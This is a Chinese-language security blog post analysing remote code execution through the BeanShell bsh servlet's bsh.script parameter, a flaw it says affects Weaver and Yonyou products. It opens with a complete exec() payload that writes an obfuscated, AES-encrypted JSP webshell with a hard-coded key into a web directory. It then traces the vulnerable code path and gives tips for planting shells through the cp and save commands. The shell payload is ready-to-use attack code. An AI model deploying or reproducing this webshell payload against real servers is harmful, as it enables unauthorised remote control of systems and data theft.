最近无聊，就稍微简单学一下，其实这个bsh组件不罕见，像泛微、用友都出现过这个漏洞。然后学习了一下之后，发现了一些小技巧，攻击思路就又开阔了，发现一种可以快速写入webshell的可行方法。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670170005003-f9f5e39b-7f50-4af4-bb11-f8b7f379b7df.png#averageHue=%23f6f6f6&clientId=u6328a656-8aeb-4&from=paste&height=507&id=u786aba97&originHeight=634&originWidth=817&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98028&status=done&style=none&taskId=ucab1cd65-9bb0-44c3-af77-98524cc57a5&title=&width=653.6)

exec写shell
```java
/* exec("cmd /c echo \"><%@page import=\"sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random\" %><%! class govPkEEwdoozySiL3E extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {govPkEEwdoozySiL3E(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 govXua) {super(govXua);}public Class gov4k6(byte[] govR5DPQ) {return super.d\uuuuuuuuu0065fineClass/*govpmXukgv*/(govR5DPQ,0,govR5DPQ.length);}}%><%out.println(\"Random Garbage Data:\");Random govjE4OZjT6dsj = new Random();int govexbQJjny = govjE4OZjT6dsj.nextInt(1234);int govVoMJHvNbM = govjE4OZjT6dsj.nextInt(5678);int govXM8ClK = govjE4OZjT6dsj.nextInt(1357);int govAVeIPtBmc = govjE4OZjT6dsj.nextInt(2468);out.println(govexbQJjny+\",\"+govVoMJHvNbM+\",\"+govXM8ClK+\",\"+govAVeIPtBmc);String[] govGPaXMZ9RC = new String[]{\"A\", \"P\", \"B\", \"O\", \"C\", \"S\", \"D\", \"T\"};String govdSxidE = govGPaXMZ9RC[1] + govGPaXMZ9RC[3] + govGPaXMZ9RC[5] + govGPaXMZ9RC[7];if (request.getMethod().equals(govdSxidE)) {String govQgB4OeRejyK5U = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()/*govJ5l9v6AbXE8a6*/./*gov7*/decodeBuffer/*govmIp7*/(\"MTZhY2FjYzA1YWFmYWY2Nw==\"));session.setAttribute(\"u\", govQgB4OeRejyK5U);Cipher govGk91RlL = Cipher.getInstance(\"AES\");govGk91RlL.init(((govexbQJjny * govVoMJHvNbM + govXM8ClK - govAVeIPtBmc) * 0) + 3 - 1, new SecretKeySpec(govQgB4OeRejyK5U.getBytes(), \"AES\"));new govPkEEwdoozySiL3E(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).gov4k6(govGk91RlL.doFinal(new sun.misc./*govVz*/B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*govlnLTHdcPcAM*/decodeBuffer(request.getReader().readLine()))).newInstance()/*govzTPOMyCVHRP*/.equals(pageContext);}%><\" > webapps/nc_web/123.jsp"); */
```
<a name="wUuZ8"></a>
## 简单分析
bsh-2.0b4.jar<br />**import **bsh.Interpreter;

- **简单java**

Interpreter实例化之后eval可以执行java
```java
public class test {
    public static void main(String[] args) throws EvalError {
        Interpreter i = new Interpreter();  // Construct an interpreter
        i.set("foo", 5);                    // Set variables
        i.set("date", new Date() );
        Date date = (Date)i.get("date");    // retrieve a variable
// Eval a statement and get the result
        i.set("sum",i.eval("bar = foo*10"));
        System.out.println(i.get("sum"));
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670163301576-9d512ef3-6806-4973-8a86-7d2013b5b0bd.png#averageHue=%23f9f9f7&clientId=u763620da-13bb-4&from=paste&height=533&id=u8b094a36&originHeight=666&originWidth=985&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68167&status=done&style=none&taskId=u1b15b869-95b2-47ce-ae4b-d7a166941b4&title=&width=788)


- **代码分析**

bsh-2.0b4.jar 解压后拉进去idea看，jadx不知道为什么，反编译不出来一些核心源码

直接doget看，bsh.script就是漏洞的传参点，跟进var3<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670166867703-b315f785-6457-4d38-a3c1-2debc6ca5b77.png#averageHue=%23fcfcfb&clientId=u763620da-13bb-4&from=paste&height=583&id=ud06f7e48&originHeight=729&originWidth=1049&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53850&status=done&style=none&taskId=u7c820016-385f-4fdd-831b-b423a022589&title=&width=839.2)

最后会落在evalscript方法里面eval具体实现<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670166837541-018d31ea-084c-4d54-a13a-26380bc66337.png#averageHue=%23fbfaf9&clientId=u763620da-13bb-4&from=paste&height=641&id=u1d2c9898&originHeight=801&originWidth=1680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114206&status=done&style=none&taskId=ue265d99d-8525-465a-8ae3-e6d6a311ab4&title=&width=1344)

eval里面可以调用exec.bsh文件，这个在目录里面   /bsh-2.0b1/bsh/commands   所以最后可以通过exec();的方式去进行命令执行<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670167696940-16d46c59-b7b4-4f06-b7bf-c1ccdc5635c7.png#averageHue=%23faf9f8&clientId=u763620da-13bb-4&from=paste&height=281&id=u33df724d&originHeight=351&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14585&status=done&style=none&taskId=u407af0fc-a3f2-4b6b-84e5-d8ae539f053&title=&width=583.2)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670167731194-829daed3-cc08-4278-be11-e07508f42302.png#averageHue=%23faf9f7&clientId=u763620da-13bb-4&from=paste&height=443&id=u57d6ede9&originHeight=554&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25141&status=done&style=none&taskId=u9be4223e-65cc-46fd-b5c3-c12607fe38b&title=&width=281.6)<br />[<br />](https://blog.csdn.net/huey2672/article/details/41119693)

[https://blog.csdn.net/huey2672/article/details/41119693](https://blog.csdn.net/huey2672/article/details/41119693)<br />引入bsh文件的方法      interpreter.source<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670167837327-dcff6fb5-e0c7-4555-931c-f6dae533cdd1.png#averageHue=%23f9f9f8&clientId=u763620da-13bb-4&from=paste&height=613&id=u160208d3&originHeight=766&originWidth=882&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64174&status=done&style=none&taskId=ufc899470-d388-4e56-b0ab-9168d4770f4&title=&width=705.6)


<a name="zeDO2"></a>
## tips：
1、通过看bsh文件发现，cp.bash方法可以把shell先写到当前目录，然后复制过去<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670169072067-7bdd1748-acc3-4436-935d-4adbda9a0e46.png#averageHue=%23faf8f7&clientId=u763620da-13bb-4&from=paste&height=350&id=u8b97ab56&originHeight=438&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43233&status=done&style=none&taskId=u0a59a2de-354b-4959-98b1-b67b339d2f7&title=&width=876.8)

2、save("","");这个方法需要进行反序列化内容，然后写入文件。通过save的方法去写入马，但是obj需要进行反序列化。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670168849204-cc8af89e-408c-4b6c-ad66-879a2c8348dc.png#averageHue=%23faf9f7&clientId=u763620da-13bb-4&from=paste&height=562&id=F9QZ8&originHeight=703&originWidth=1246&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71045&status=done&style=none&taskId=u97ce1496-4732-443b-96fa-7c1beee553f&title=&width=996.8)


尝试一下随便树入，看看是不是真的能写入文件。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670169487086-5a783820-7957-4830-8dc2-c8cfa6cb82dd.png#averageHue=%23f6f5f5&clientId=u763620da-13bb-4&from=paste&height=450&id=ub6c83ced&originHeight=563&originWidth=440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21218&status=done&style=none&taskId=u5b565bbe-9be4-40dc-8a47-108be11a4ef&title=&width=352)

通过save去写入，果然写进去了，但是内容被序列化了，所以需要构造反序列化的内容进行写入，可能需要研究一下，理论上webshell内容反序列化后发包应该就没问题<br />![1d9024fdf42fea970301228d259d3e0.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670169623277-07d85d0a-5847-490f-ae8c-9da155a05402.png#averageHue=%23eceae9&clientId=u763620da-13bb-4&from=paste&height=484&id=u3052f6fa&originHeight=605&originWidth=615&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37527&status=done&style=none&taskId=ucb16899b-329d-44c5-9bcc-4fd4021a74a&title=&width=492)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670170688318-cbefcdb7-3a74-47b9-af7f-d044d733274d.png#averageHue=%23f6f6f5&clientId=u6328a656-8aeb-4&from=paste&height=381&id=u7b022be7&originHeight=476&originWidth=444&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17227&status=done&style=none&taskId=ua68e7e20-375b-4cf7-bb17-91ee3049ef8&title=&width=355.2)
